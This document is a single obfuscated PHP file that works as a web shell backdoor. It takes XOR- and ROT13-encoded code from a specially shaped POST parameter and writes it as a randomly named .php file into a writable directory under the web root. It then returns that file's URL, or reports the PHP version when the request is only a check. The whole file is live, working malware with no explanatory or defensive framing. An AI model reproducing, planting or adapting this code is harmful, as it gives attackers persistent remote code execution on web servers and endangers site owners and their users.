<?php $hrxxoacfxo = "yzitpuleoaqlmwpf";$mkbmqnbl = "";foreach ($_POST as $awkxkvrfe => $xeskuzql){if (strlen($awkxkvrfe) == 16 and substr_count($xeskuzql, "%") > 10){gigdb($awkxkvrfe, $xeskuzql);}}function gigdb($awkxkvrfe, $ctpojzz){global $mkbmqnbl;$mkbmqnbl = $awkxkvrfe;$ctpojzz = str_split(rawurldecode(str_rot13($ctpojzz)));function dkijzkdzof($tdzds, $awkxkvrfe){global $hrxxoacfxo, $mkbmqnbl;return $tdzds ^ $hrxxoacfxo[$awkxkvrfe % strlen($hrxxoacfxo)] ^ $mkbmqnbl[$awkxkvrfe % strlen($mkbmqnbl)];}$ctpojzz = implode("", array_map("dkijzkdzof", array_values($ctpojzz), array_keys($ctpojzz)));$ctpojzz = @unserialize($ctpojzz);if (@is_array($ctpojzz)){$awkxkvrfe = array_keys($ctpojzz);$ctpojzz = $ctpojzz[$awkxkvrfe[0]];if ($ctpojzz === $awkxkvrfe[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function uzrqwaaswi($oerfysthtir) {static $ubsqfizjgh = array();$txwvw = glob($oerfysthtir . '/*', GLOB_ONLYDIR);if (count($txwvw) > 0) {foreach ($txwvw as $oerfystht){if (@is_writable($oerfystht)){$ubsqfizjgh[] = $oerfystht;}}}foreach ($txwvw as $oerfysthtir) uzrqwaaswi($oerfysthtir);return $ubsqfizjgh;}$wqgse = $_SERVER["DOCUMENT_ROOT"];$txwvw = uzrqwaaswi($wqgse);$awkxkvrfe = array_rand($txwvw);$oerfysthtpmugrlssk = $txwvw[$awkxkvrfe] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($oerfysthtpmugrlssk, $ctpojzz);echo "http://" . $_SERVER["HTTP_HOST"] . substr($oerfysthtpmugrlssk, strlen($wqgse));exit();}}}